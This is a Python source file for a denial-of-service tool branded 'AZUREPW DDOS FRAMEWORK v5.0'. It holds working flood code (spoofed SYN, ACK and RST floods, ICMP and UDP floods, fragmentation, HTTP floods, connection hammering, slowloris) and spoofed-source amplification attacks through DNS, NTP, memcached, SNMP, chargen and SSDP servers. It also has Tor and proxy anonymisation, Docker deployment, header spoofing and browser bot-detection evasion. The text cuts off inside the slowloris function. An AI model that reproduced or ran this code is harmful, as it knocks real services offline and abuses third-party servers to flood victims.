#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AZUREPW DDOS FRAMEWORK v5.0 - HYBRID EDITION
Original: arezpw.py + Auto-Detect + Auto-Setup + VPS Management
"""

# ===== ORIGINAL IMPORTS (from arezpw.py) =====
import os
import sys
import time
import random
import socket
import threading
import requests
import ssl
import base64
import hashlib
import subprocess
import json
import re
from urllib.parse import urlparse, urlencode
from datetime import datetime

# ===== NEW IMPORTS (for auto-setup) =====
import platform
import argparse
from concurrent.futures import ThreadPoolExecutor

# ===== GLOBAL VARIABLES =====
# Original from arezpw.py
TARGET_IP = ""
TARGET_URL = ""
TARGET_DOMAIN = ""
DURATION = 600
THREADS = 200
PROTOCOL = "https"
PROXY_LIST = []
TOR_PROXY = None
CLOUDFLARE_BYPASS = False
HONEYPOT_BYPASS = False
ENCRYPT_TRAFFIC = False
RANDOMIZE_HEADERS = True
COOKIE_TAMPERING = True
SESSION_FIXATION = True
DNS_SERVERS = ["8.8.8.8", "1.1.1.1", "9.9.9.9"]
NTP_SERVERS = ["pool.ntp.org", "time.nist.gov"]
MEMCACHED_SERVERS = ["11211.memcached.server"]
SNMP_SERVERS = ["public.snmp.server"]
CHARGEN_SERVERS = ["chargen.server"]
SSDP_SERVERS = ["239.255.255.250"]
USER_AGENTS = []
ATTACK_STATS = {"hits": 0, "errors": 0, "start_time": None}

# New global variables
PLATFORM = ""
REQUIREMENTS_OK = False
DOCKER_INSTALLED = False
VPS_READY = False
SETUP_COMPLETE = False

# ===== COLORS FOR CLI =====
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

# ===== PLATFORM DETECTION =====
def detect_platform():
    global PLATFORM
    system = platform.system().lower()
    
    if system == "linux":
        # Check if Android
        try:
            with open('/proc/version', 'r') as f:
                if 'android' in f.read().lower():
                    PLATFORM = "android"
                    return
        except:
            pass
        PLATFORM = "linux"
    elif system == "windows":
        PLATFORM = "windows"
    elif system == "darwin":
        PLATFORM = "macos"
    else:
        PLATFORM = "unknown"
    
    print(f"{Colors.CYAN}[✓] Platform detected: {PLATFORM.upper()}{Colors.ENDC}")

# ===== CHECK REQUIREMENTS =====
def check_dependencies():
    global REQUIREMENTS_OK, DOCKER_INSTALLED
    
    print(f"\n{Colors.YELLOW}[!] Checking requirements...{Colors.ENDC}")
    
    # Check Python version
    if sys.version_info < (3, 6):
        print(f"{Colors.RED}[✗] Python 3.6+ required!{Colors.ENDC}")
        return False
    
    # Check Docker (for Linux/Windows)
    if PLATFORM in ["linux", "windows"]:
        try:
            result = subprocess.run(['docker', '--version'], 
                                  capture_output=True, text=True)
            if result.returncode == 0:
                DOCKER_INSTALLED = True
                print(f"{Colors.GREEN}[✓] Docker installed{Colors.ENDC}")
            else:
                print(f"{Colors.YELLOW}[!] Docker not installed (optional for VPS mode){Colors.ENDC}")
        except:
            print(f"{Colors.YELLOW}[!] Docker not installed (optional for VPS mode){Colors.ENDC}")
    
    # Check internet connection
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        print(f"{Colors.GREEN}[✓] Internet connection OK{Colors.ENDC}")
    except:
        print(f"{Colors.RED}[✗] No internet connection{Colors.ENDC}")
        return False
    
    # Check Python packages
    required_packages = [
        'scapy', 'requests', 'selenium', 'beautifulsoup4', 
        'fake-useragent', 'stem', 'PySocks', 'pycryptodome'
    ]
    
    missing_packages = []
    for package in required_packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print(f"{Colors.YELLOW}[!] Missing packages: {', '.join(missing_packages)}{Colors.ENDC}")
        return False
    
    print(f"{Colors.GREEN}[✓] All requirements satisfied{Colors.ENDC}")
    REQUIREMENTS_OK = True
    return True

# ===== INSTALL MISSING DEPENDENCIES =====
def install_dependencies():
    print(f"\n{Colors.YELLOW}[!] Installing missing dependencies...{Colors.ENDC}")
    
    # Install Docker if needed
    if PLATFORM in ["linux", "windows"] and not DOCKER_INSTALLED:
        print(f"{Colors.CYAN}[+] Installing Docker...{Colors.ENDC}")
        try:
            if PLATFORM == "linux":
                subprocess.run(['curl', '-fsSL', 'https://get.docker.com', '-o', 'get-docker.sh'], check=True)
                subprocess.run(['sh', 'get-docker.sh'], check=True)
                subprocess.run(['usermod', '-aG', 'docker', os.getenv('USER')], check=True)
                print(f"{Colors.GREEN}[✓] Docker installed successfully{Colors.ENDC}")
                print(f"{Colors.YELLOW}[!] Please reboot and run script again{Colors.ENDC}")
                sys.exit(0)
            elif PLATFORM == "windows":
                print(f"{Colors.YELLOW}[!] Please install Docker Desktop manually from https://www.docker.com/products/docker-desktop{Colors.ENDC}")
                print(f"{Colors.YELLOW}[!] Then run the script again{Colors.ENDC}")
                sys.exit(0)
        except Exception as e:
            print(f"{Colors.RED}[✗] Failed to install Docker: {e}{Colors.ENDC}")
            return False
    
    # Install Python packages
    required_packages = [
        'scapy', 'requests', 'selenium', 'beautifulsoup4', 
        'fake-useragent', 'stem', 'PySocks', 'pycryptodome'
    ]
    
    for package in required_packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            print(f"{Colors.CYAN}[+] Installing {package}...{Colors.ENDC}")
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', package], check=True)
                print(f"{Colors.GREEN}[✓] {package} installed{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.RED}[✗] Failed to install {package}: {e}{Colors.ENDC}")
                return False
    
    return True

# ===== SETUP VPS ENVIRONMENT =====
def setup_vps_environment():
    global VPS_READY
    
    if not DOCKER_INSTALLED:
        print(f"{Colors.YELLOW}[!] Skipping VPS setup (Docker not installed){Colors.ENDC}")
        return False
    
    print(f"\n{Colors.YELLOW}[!] Setting up VPS environment...{Colors.ENDC}")
    
    try:
        # Create Dockerfile
        dockerfile_content = """FROM ubuntu:20.04
RUN apt-get update && apt-get install -y \\
    python3 \\
    python3-pip \\
    hping3 \\
    net-tools \\
    iproute2 \\
    && rm -rf /var/lib/apt/lists/*
RUN pip3 install --no-cache-dir \\
    scapy \\
    requests \\
    selenium \\
    beautifulsoup4 \\
    fake-useragent \\
    stem \\
    PySocks \\
    pycryptodome
WORKDIR /app
COPY azurepw.py /app/azurepw.py
EXPOSE 8080
CMD ["python3", "azurepw.py"]
"""
        
        with open('Dockerfile', 'w') as f:
            f.write(dockerfile_content)
        
        # Create docker-compose.yml
        compose_content = """version: '3.8'
services:
  ddos-vps:
    image: azurepw-vps
    container_name: azurepw-ddos
    restart: unless-stopped
    ports:
      - "8080:8080"
    environment:
      - VPS_MODE=true
    volumes:
      - ./logs:/app/logs
"""
        
        with open('docker-compose.yml', 'w') as f:
            f.write(compose_content)
        
        # Build Docker image
        print(f"{Colors.CYAN}[+] Building Docker image...{Colors.ENDC}")
        subprocess.run(['docker', 'build', '-t', 'azurepw-vps', '.'], check=True)
        
        print(f"{Colors.GREEN}[✓] VPS environment ready{Colors.ENDC}")
        VPS_READY = True
        return True
    
    except Exception as e:
        print(f"{Colors.RED}[✗] Failed to setup VPS: {e}{Colors.ENDC}")
        return False

# ===== ANDROID DISCLAIMER =====
def show_android_disclaimer():
    print(f"""
{Colors.RED}
{'='*60}
!!! ANDROID DISCLAIMER !!!
{'='*60}

This script is NOT COMPATIBLE with Android devices.

Reasons:
1. Android doesn't support Docker
2. Limited system resources
3. No root access for network operations
4. Battery and performance issues

RECOMMENDATIONS:
1. Use a Linux/Windows PC or VPS
2. Install Termux for limited operations
3. Use cloud-based solutions

{'='*60}
{Colors.ENDC}
""")
    
    input(f"{Colors.YELLOW}[!] Press Enter to exit...{Colors.ENDC}")
    sys.exit(0)

# ===== ORIGINAL FUNCTIONS FROM arezpw.py =====
# (Keep all the original functions here)
# Auto-check dependencies
def check_dependencies_original():
    required_packages = [
        'scapy', 'requests', 'selenium', 'beautifulsoup4', 
        'fake-useragent', 'stem', 'PySocks', 'pycryptodome'
    ]
    
    missing_packages = []
    for package in required_packages:
        try:
            __import__(package.replace('-', '_'))
        except ImportError:
            missing_packages.append(package)
    
    if missing_packages:
        print("[✗] Missing packages:", ", ".join(missing_packages))
        print("[!] Installing missing packages...")
        for package in missing_packages:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package])
        print("[✓] All packages installed!")

# Import modules
try:
    from scapy.all import *
    from scapy.layers.inet import IP, TCP, UDP, ICMP
    from scapy.layers.dns import DNS, DNSQR
    from scapy.layers.ntp import NTP
    from scapy.layers.snmp import SNMP, SNMPvarbind
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
except ImportError as e:
    print(f"[✗] Import error: {e}")
    sys.exit(1)

from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
import socks
import stem.process

# ===== CLI MENU =====
def cli_menu():
    print("\n" + "="*80)
    print("   AZUREPW DDOS FRAMEWORK v5.0 - HYBRID EDITION")
    print("="*80)
    
    # Get target
    while True:
        target = input("[1] Enter target (IP or domain): ").strip()
        if target:
            break
        print("[!] Target cannot be empty!")
    
    # Get attack method
    print("\n[2] Select attack method:")
    print("    1. ALL METHODS (RECOMMENDED - 25+ ATTACKS)")
    print("    2. Layer 3 (IP Fragmentation, ICMP, etc)")
    print("    3. Layer 4 (TCP/UDP Floods, Amplification)")
    print("    4. Layer 7 (HTTP Floods, Hammering, etc)")
    print("    5. Advanced Bypass (Cloudflare, Honeypot, etc)")
    print("    6. Specialized Attacks (WordPress, Drupal, etc)")
    print("    7. Custom Attack (Mix & Match)")
    print("    8. VPS Management")
    print("    9. System Status")
    
    while True:
        method_choice = input("    Choose (1-9): ").strip()
        if method_choice in ['1', '2', '3', '4', '5', '6', '7', '8', '9']:
            break
        print("[!] Invalid choice! Enter 1-9")
    
    # Get duration
    while True:
        duration = input("[3] Duration (seconds, default=600): ").strip()
        if not duration:
            duration = "600"
        if duration.isdigit():
            break
        print("[!] Duration must be a number!")
    
    # Get threads
    while True:
        threads = input("[4] Threads (default=200): ").strip()
        if not threads:
            threads = "200"
        if threads.isdigit():
            break
        print("[!] Threads must be a number!")
    
    # Get proxy file
    proxy_file = input("[5] Proxy file (leave empty if none): ").strip()
    
    # Get advanced options
    tor_enable = input("[6] Enable Tor? (y/n, default=y): ").strip().lower() or 'y'
    encrypt_enable = input("[7] Enable encryption? (y/n, default=y): ").strip().lower() or 'y'
    random_headers = input("[8] Enable random headers? (y/n, default=y): ").strip().lower() or 'y'
    cloudflare_enable = input("[9] Enable Cloudflare bypass? (y/n, default=y): ").strip().lower() or 'y'
    honeypot_enable = input("[10] Enable honeypot bypass? (y/n, default=y): ").strip().lower() or 'y'
    cookie_enable = input("[11] Enable cookie tampering? (y/n, default=y): ").strip().lower() or 'y'
    session_enable = input("[12] Enable session fixation? (y/n, default=y): ").strip().lower() or 'y'
    
    # Return all choices
    return {
        'target': target,
        'method': method_choice,
        'duration': int(duration),
        'threads': int(threads),
        'proxy_file': proxy_file,
        'tor': tor_enable == 'y',
        'encrypt': encrypt_enable == 'y',
        'random_headers': random_headers == 'y',
        'cloudflare': cloudflare_enable == 'y',
        'honeypot': honeypot_enable == 'y',
        'cookie': cookie_enable == 'y',
        'session': session_enable == 'y'
    }

# ===== VPS MANAGEMENT MENU =====
def vps_management_menu():
    while True:
        print(f"\n{Colors.MAGENTA}")
        print("="*50)
        print("VPS MANAGEMENT")
        print("="*50)
        print(f"{Colors.ENDC}")
        print(f"{Colors.GREEN}1. Start VPS Container{Colors.ENDC}")
        print(f"{Colors.GREEN}2. Stop VPS Container{Colors.ENDC}")
        print(f"{Colors.GREEN}3. Restart VPS Container{Colors.ENDC}")
        print(f"{Colors.GREEN}4. VPS Status{Colors.ENDC}")
        print(f"{Colors.GREEN}5. VPS Logs{Colors.ENDC}")
        print(f"{Colors.YELLOW}6. Back to Main Menu{Colors.ENDC}")
        
        choice = input(f"\n{Colors.CYAN}[?] Enter your choice (1-6): {Colors.ENDC}").strip()
        
        if choice == "1":
            start_vps()
        elif choice == "2":
            stop_vps()
        elif choice == "3":
            restart_vps()
        elif choice == "4":
            show_vps_status()
        elif choice == "5":
            show_vps_logs()
        elif choice == "6":
            break
        else:
            print(f"{Colors.RED}[✗] Invalid choice!{Colors.ENDC}")

def start_vps():
    if not VPS_READY:
        print(f"{Colors.RED}[✗] VPS not ready! Please setup first.{Colors.ENDC}")
        return
    
    print(f"\n{Colors.YELLOW}[!] Starting VPS container...{Colors.ENDC}")
    
    try:
        subprocess.run(['docker-compose', 'up', '-d'], check=True)
        print(f"{Colors.GREEN}[✓] VPS container started{Colors.ENDC}")
        
        # Show container info
        result = subprocess.run(['docker', 'ps', '--filter', 'name=azurepw-ddos', '--format', 'table {{.Names}}\t{{.Status}}\t{{.Ports}}'], 
                              capture_output=True, text=True)
        print(f"\n{Colors.CYAN}{result.stdout}{Colors.ENDC}")
        
    except Exception as e:
        print(f"{Colors.RED}[✗] Failed to start VPS: {e}{Colors.ENDC}")

def stop_vps():
    print(f"\n{Colors.YELLOW}[!] Stopping VPS container...{Colors.ENDC}")
    
    try:
        subprocess.run(['docker-compose', 'down'], check=True)
        print(f"{Colors.GREEN}[✓] VPS container stopped{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[✗] Failed to stop VPS: {e}{Colors.ENDC}")

def restart_vps():
    print(f"\n{Colors.YELLOW}[!] Restarting VPS container...{Colors.ENDC}")
    
    try:
        subprocess.run(['docker-compose', 'restart'], check=True)
        print(f"{Colors.GREEN}[✓] VPS container restarted{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.RED}[✗] Failed to restart VPS: {e}{Colors.ENDC}")

def show_vps_status():
    print(f"\n{Colors.YELLOW}[!] VPS Container Status{Colors.ENDC}")
    
    try:
        result = subprocess.run(['docker', 'ps', '--filter', 'name=azurepw-ddos', '--format', 'table {{.Names}}\t{{.Status}}\t{{.Ports}}'], 
                              capture_output=True, text=True)
        print(f"{Colors.CYAN}{result.stdout}{Colors.ENDC}")
        
        # Show resource usage
        result = subprocess.run(['docker', 'stats', 'azurepw-ddos', '--no-stream', '--format', 'table {{.Container}}\t{{.CPUPerc}}\t{{.MemUsage}}'], 
                              capture_output=True, text=True)
        print(f"{Colors.CYAN}{result.stdout}{Colors.ENDC}")
        
    except Exception as e:
        print(f"{Colors.RED}[✗] Failed to get VPS status: {e}{Colors.ENDC}")

def show_vps_logs():
    print(f"\n{Colors.YELLOW}[!] VPS Container Logs{Colors.ENDC}")
    
    try:
        result = subprocess.run(['docker', 'logs', '--tail', '50', 'azurepw-ddos'], 
                              capture_output=True, text=True)
        print(f"{Colors.CYAN}{result.stdout}{Colors.ENDC}")
        
    except Exception as e:
        print(f"{Colors.RED}[✗] Failed to get VPS logs: {e}{Colors.ENDC}")

# ===== SYSTEM STATUS =====
def show_system_status():
    print(f"\n{Colors.YELLOW}[!] System Status{Colors.ENDC}")
    print(f"{Colors.CYAN}    Platform: {PLATFORM.upper()}{Colors.ENDC}")
    print(f"{Colors.CYAN}    Python: {sys.version.split()[0]}{Colors.ENDC}")
    print(f"{Colors.CYAN}    Docker: {'Installed' if DOCKER_INSTALLED else 'Not Installed'}{Colors.ENDC}")
    print(f"{Colors.CYAN}    VPS Ready: {'Yes' if VPS_READY else 'No'}{Colors.ENDC}")
    print(f"{Colors.CYAN}    Requirements: {'OK' if REQUIREMENTS_OK else 'Missing'}{Colors.ENDC}")
    
    # Check internet
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        print(f"{Colors.CYAN}    Internet: Connected{Colors.ENDC}")
    except:
        print(f"{Colors.RED}    Internet: Disconnected{Colors.ENDC}")
    
    # Show disk space
    if PLATFORM in ["linux", "windows"]:
        try:
            result = subprocess.run(['df', '-h', '.'], capture_output=True, text=True)
            lines = result.stdout.strip().split('\n')
            if len(lines) > 1:
                print(f"{Colors.CYAN}    Disk Space: {lines[1].split()[3]} free{Colors.ENDC}")
        except:
            pass

# ===== ORIGINAL TARGET RESOLUTION =====
def extract_domain(url):
    try:
        parsed = urlparse(url)
        return parsed.netloc
    except:
        return url

def is_domain(target):
    try:
        socket.inet_aton(target)
        return False
    except socket.error:
        return True

def resolve_target(target):
    global TARGET_IP, TARGET_URL, TARGET_DOMAIN
    
    if target.startswith(('http://', 'https://')):
        target = extract_domain(target)
    
    if is_domain(target):
        TARGET_DOMAIN = target
        try:
            TARGET_IP = socket.gethostbyname(target)
            print(f"[✓] Resolved: {target} → {TARGET_IP}")
        except socket.gaierror:
            print(f"[✗] Failed to resolve: {target}")
            sys.exit(1)
        
        TARGET_URL = f"{PROTOCOL}://{target}"
    else:
        TARGET_IP = target
        TARGET_URL = f"{PROTOCOL}://{target}"
        print(f"[✓] Target IP: {TARGET_IP}")

# ===== ORIGINAL LOAD PROXIES =====
def load_proxies(proxy_file):
    global PROXY_LIST
    if not proxy_file:
        return
        
    try:
        with open(proxy_file, 'r') as f:
            PROXY_LIST = [line.strip() for line in f if line.strip()]
        print(f"[✓] Loaded {len(PROXY_LIST)} proxies")
    except FileNotFoundError:
        print(f"[✗] Proxy file not found: {proxy_file}")
        PROXY_LIST = []

# ===== ORIGINAL SETUP TOR =====
def setup_tor():
    global TOR_PROXY
    try:
        tor_process = stem.process.launch_tor_with_config(
            config = {
                'SocksPort': '9050',
                'ExitNodes': '{us}',
            },
            init_msg_handler = print_line,
        )
        TOR_PROXY = "socks5://127.0.0.1:9050"
        print("[✓] Tor network initialized")
        return tor_process
    except Exception as e:
        print(f"[✗] Tor setup failed: {e}")
        return None

def print_line(line):
    if "Bootstrapped" in line:
        print(f"[Tor] {line}")

# ===== ORIGINAL SETUP SELENIUM =====
def setup_selenium():
    try:
        chrome_options = Options()
        chrome_options.add_argument("--headless")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.add_argument("--no-sandbox")
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-blink-features=AutomationControlled")
        chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
        chrome_options.add_experimental_option('useAutomationExtension', False)
        
        if TOR_PROXY:
            chrome_options.add_argument(f"--proxy-server={TOR_PROXY}")
        
        driver = webdriver.Chrome(options=chrome_options)
        driver.execute_script("Object.defineProperty(navigator, 'webdriver', {get: () => undefined})")
        return driver
    except Exception as e:
        print(f"[✗] Selenium setup failed: {e}")
        return None

# ===== ORIGINAL GENERATE RANDOM HEADERS =====
def generate_headers():
    if not RANDOMIZE_HEADERS:
        return {}
    
    try:
        ua = UserAgent()
        headers = {
            "User-Agent": ua.random,
            "Accept": random.choice([
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
            ]),
            "Accept-Language": random.choice([
                "en-US,en;q=0.9",
                "en-GB,en;q=0.9",
                "en;q=0.9,id;q=0.8"
            ]),
            "Accept-Encoding": random.choice([
                "gzip, deflate, br",
                "gzip, deflate",
                "br"
            ]),
            "Connection": random.choice([
                "keep-alive",
                "close"
            ]),
            "Upgrade-Insecure-Requests": "1",
            "Cache-Control": random.choice([
                "max-age=0",
                "no-cache",
                "no-store",
                "no-transform"
            ]),
            "DNT": random.choice(["0", "1"]),
            "Sec-Fetch-Dest": random.choice(["document", "script", "image", "style"]),
            "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors", "same-origin"]),
            "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
            "Sec-Fetch-User": random.choice(["?1", "?0"]),
            "Sec-GPC": random.choice(["1", ""])
        }
        
        # Add random headers
        if random.random() > 0.5:
            headers["X-Forwarded-For"] = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        
        if random.random() > 0.5:
            headers["X-Real-IP"] = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
        
        if random.random() > 0.5:
            headers["Referer"] = random.choice([
                "https://google.com/",
                "https://facebook.com/",
                "https://twitter.com/",
                "https://youtube.com/",
                "https://instagram.com/"
            ])
        
        if random.random() > 0.5:
            headers["Origin"] = random.choice([
                "https://google.com",
                "https://facebook.com",
                "https://twitter.com"
            ])
        
        return headers
    except Exception as e:
        print(f"[✗] Header generation failed: {e}")
        return {}

# ===== ORIGINAL ENCRYPT PAYLOAD =====
def encrypt_payload(data):
    if not ENCRYPT_TRAFFIC:
        return data
    
    try:
        key = hashlib.sha256(b"ddos_key").digest()
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        iv = cipher.iv
        return base64.b64encode(iv + ct_bytes)
    except Exception as e:
        print(f"[✗] Encryption failed: {e}")
        return data

# ===== ORIGINAL ATTACK FUNCTIONS =====
# (Keep all the original attack functions from arezpw.py here)
# ===== LAYER 3 ATTACKS =====
def ip_fragmentation():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            payload = encrypt_payload(os.urandom(1024))
            # Fragment with overlap for evasion
            send(IP(dst=TARGET_IP, frag=5, id=random.randint(1000, 9000))/ICMP()/Raw(load=payload), verbose=0, count=5)
        except:
            ATTACK_STATS["errors"] += 1

def icmp_flood():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            payload = encrypt_payload(os.urandom(512))
            send(IP(dst=TARGET_IP)/ICMP(type=8, code=0, id=random.randint(1000, 9000))/Raw(load=payload), verbose=0, count=10)
            ATTACK_STATS["hits"] += 10
        except:
            ATTACK_STATS["errors"] += 1

# ===== LAYER 4 ATTACKS =====
def syn_flood():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            
            ip = IP(src=src_ip, dst=TARGET_IP, id=random.randint(1000, 9000))
            tcp = TCP(sport=src_port, dport=80, flags="S", seq=random.randint(1000, 9000), window=random.randint(1000, 9000))
            send(ip/tcp, verbose=0, count=5)
            ATTACK_STATS["hits"] += 5
        except:
            ATTACK_STATS["errors"] += 1

def ack_flood():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            
            ip = IP(src=src_ip, dst=TARGET_IP)
            tcp = TCP(sport=src_port, dport=80, flags="A", seq=random.randint(1000, 9000), ack=random.randint(1000, 9000))
            send(ip/tcp, verbose=0, count=5)
            ATTACK_STATS["hits"] += 5
        except:
            ATTACK_STATS["errors"] += 1

def rst_flood():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            src_port = random.randint(1024, 65535)
            
            ip = IP(src=src_ip, dst=TARGET_IP)
            tcp = TCP(sport=src_port, dport=80, flags="R", seq=random.randint(1000, 9000))
            send(ip/tcp, verbose=0, count=5)
            ATTACK_STATS["hits"] += 5
        except:
            ATTACK_STATS["errors"] += 1

def udp_flood():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            port = random.randint(1, 65535)
            payload = encrypt_payload(os.urandom(1024))
            send(IP(dst=TARGET_IP)/UDP(dport=port)/Raw(load=payload), verbose=0, count=5)
            ATTACK_STATS["hits"] += 5
        except:
            ATTACK_STATS["errors"] += 1

# ===== AMPLIFICATION ATTACKS =====
def dns_amplification():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            dns_server = random.choice(DNS_SERVERS)
            ip = IP(src=TARGET_IP, dst=dns_server)
            udp = UDP(sport=RandShort(), dport=53)
            dns = DNS(rd=1, qd=DNSQR(qname="example.com", qtype="ANY"))
            send(ip/udp/dns, verbose=0, count=10)
            ATTACK_STATS["hits"] += 10
        except:
            ATTACK_STATS["errors"] += 1

def ntp_amplification():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            ntp_server = random.choice(NTP_SERVERS)
            ip = IP(src=TARGET_IP, dst=ntp_server)
            udp = UDP(sport=RandShort(), dport=123)
            ntp = NTP(version=2, mode=7)
            send(ip/udp/ntp, verbose=0, count=10)
            ATTACK_STATS["hits"] += 10
        except:
            ATTACK_STATS["errors"] += 1

def memcached_amplification():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            mem_server = random.choice(MEMCACHED_SERVERS)
            ip = IP(src=TARGET_IP, dst=mem_server)
            udp = UDP(sport=RandShort(), dport=11211)
            payload = b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'
            send(ip/udp/payload, verbose=0, count=5)
            ATTACK_STATS["hits"] += 5
        except:
            ATTACK_STATS["errors"] += 1

def snmp_amplification():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            snmp_server = random.choice(SNMP_SERVERS)
            ip = IP(src=TARGET_IP, dst=snmp_server)
            udp = UDP(sport=RandShort(), dport=161)
            snmp = SNMP(community="public", PDU=SNMP.PDUget(varbindlist=[SNMPvarbind(oid='1.3.6.1.2.1.1.1.0')]))
            send(ip/udp/snmp, verbose=0, count=5)
            ATTACK_STATS["hits"] += 5
        except:
            ATTACK_STATS["errors"] += 1

def chargen_amplification():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            chargen_server = random.choice(CHARGEN_SERVERS)
            ip = IP(src=TARGET_IP, dst=chargen_server)
            udp = UDP(sport=RandShort(), dport=19)
            send(ip/udp, verbose=0, count=5)
            ATTACK_STATS["hits"] += 5
        except:
            ATTACK_STATS["errors"] += 1

def ssdp_amplification():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            ssdp_server = random.choice(SSDP_SERVERS)
            ip = IP(src=TARGET_IP, dst=ssdp_server)
            udp = UDP(sport=RandShort(), dport=1900)
            payload = b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
            send(ip/udp/payload, verbose=0, count=5)
            ATTACK_STATS["hits"] += 5
        except:
            ATTACK_STATS["errors"] += 1

# ===== LAYER 7 ATTACKS =====
def http_flood():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            headers = generate_headers()
            url = f"{TARGET_URL}/?x={random.randint(1,1000000)}&y={random.randint(1,1000000)}"
            
            proxies = None
            if PROXY_LIST:
                proxy = random.choice(PROXY_LIST)
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            elif TOR_PROXY:
                proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
            
            verify_ssl = not ENCRYPT_TRAFFIC
            
            response = requests.get(
                url, 
                headers=headers, 
                proxies=proxies, 
                timeout=5, 
                verify=verify_ssl,
                stream=True
            )
            
            for chunk in response.iter_content(chunk_size=1024):
                pass
            ATTACK_STATS["hits"] += 1
        except:
            ATTACK_STATS["errors"] += 1

def connection_hammering():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            for _ in range(10):  # Open 10 connections at once
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(5)
                
                if PROXY_LIST:
                    proxy = random.choice(PROXY_LIST)
                    proxy_host, proxy_port = proxy.split(':')
                    s.connect((proxy_host, int(proxy_port)))
                    s.send(f"CONNECT {TARGET_IP}:443 HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n".encode())
                    response = s.recv(4096)
                elif TOR_PROXY:
                    socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                    s = socks.socksocket
                    s.connect((TARGET_IP, 443))
                else:
                    s.connect((TARGET_IP, 443))
                
                # Send partial HTTP request
                s.send(b"GET / HTTP/1.1\r\nHost: " + (TARGET_DOMAIN.encode() if TARGET_DOMAIN else TARGET_IP.encode()) + b"\r\n")
                
                # Keep connection open
                time.sleep(1)
                ATTACK_STATS["hits"] += 1
        except:
            ATTACK_STATS["errors"] += 1

def request_hammering():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            headers = generate_headers()
            proxies = None
            
            if PROXY_LIST:
                proxy = random.choice(PROXY_LIST)
                proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            elif TOR_PROXY:
                proxies = {"http": TOR_PROXY, "https": TOR_PROXY}
            
            verify_ssl = not ENCRYPT_TRAFFIC
            
            # Send many requests quickly
            for _ in range(20):
                url = f"{TARGET_URL}/?x={random.randint(1,1000000)}&y={random.randint(1,1000000)}"
                requests.get(url, headers=headers, proxies=proxies, timeout=1, verify=verify_ssl)
                ATTACK_STATS["hits"] += 1
        except:
            ATTACK_STATS["errors"] += 1

def slowloris():
    start_time = time.time()
    while time.time() - start_time < DURATION:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            
            if PROXY_LIST:
                proxy = random.choice(PROXY_LIST)
                proxy_host, proxy_port = proxy.split(':')
                s.connect((proxy_host, int(proxy_port)))
                s.send(f"CONNECT {TARGET_IP}:443 HTTP/1.1\r\nHost: {TARGET_IP}\r\n\r\n".encode())
                response = s.recv(4096)
            elif TOR_PROXY:
                socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                s = socks.socksocket
                s.connect((TARGET_IP, 443))
            else:
                s.connect((TARGET_IP, 443))
            
            context = ssl.create_default_context()
            ssl_sock = context.wrap_socket(s, server_hostname=TARGET_DOMAIN if TARGET_DOMAIN else TARGET_IP)
            
